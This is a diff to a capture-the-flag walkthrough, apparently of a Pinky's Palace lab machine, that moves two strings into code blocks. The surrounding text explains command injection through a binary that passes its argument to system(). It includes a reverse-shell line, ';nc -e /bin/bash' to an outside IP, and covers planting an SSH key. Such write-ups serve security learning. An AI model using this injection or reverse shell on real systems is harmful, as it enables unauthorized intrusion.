@@ -532,7 +532,13 @@ It calls the function `sym.send` then.
 └           0x00000a96      c3             return
 ```
 
-It takes the argument which we used to call the program and put's it in another string: `/bin/echo %s >> /home/pinky/messages/stefano_msg.txt`. This string will be used as system command (`sym.imp.system`). There is no buffer overflow as it uses `asprintf` which dynamically associates the buffer based on the string length.
+It takes the argument which we used to call the program and put's it in another string: 
+
+```
+/bin/echo %s >> /home/pinky/messages/stefano_msg.txt
+```
+
+This string will be used as system command (`sym.imp.system`). There is no buffer overflow as it uses `asprintf` which dynamically associates the buffer based on the string length.
 
 But! We can break it. How? Well, as you see it puts a system command based on a string. There is no security check, like forbidden chars or anything. Based on that we can simply use a command chain with `;`. Let's see if that works:
 
@@ -553,7 +559,13 @@ That worked! As we also see, the file has owner info UID pinky and GID stefano (
 
 Good for us `nc` has the `-e` option on that machine, that makes it a bit easier. A simple reverse shell can be spawned via `qsub` in that way: `./qsub ";nc -e /bin/bash 10.20.20.135 4444"`. And voila, we have a connection.
 
-We are having access as pinky now. After some enumeration I mentioned that this user has write permissions to the file `/usr/local/bin/backup.sh`. The problem is that the group is wrong and we cannot really access it. This occurs because of the file we use to gain a reverse shell. A workaround is to gain directly access via SSH as pinky. Checking first if pinky is allowed to login: `stefano:x:1002:1002::/home/stefano:/bin/bash`. Yes, he is. Then we just place a public key of a SSH key and login with that key.
+We are having access as pinky now. After some enumeration I mentioned that this user has write permissions to the file `/usr/local/bin/backup.sh`. The problem is that the group is wrong and we cannot really access it. This occurs because of the file we use to gain a reverse shell. A workaround is to gain directly access via SSH as pinky. Checking first if pinky is allowed to login: 
+
+```
+stefano:x:1002:1002::/home/stefano:/bin/bash
+```
+
+Yes, he is. Then we just place a public key of a SSH key and login with that key.
 
 Now we have access to backup.sh!
 
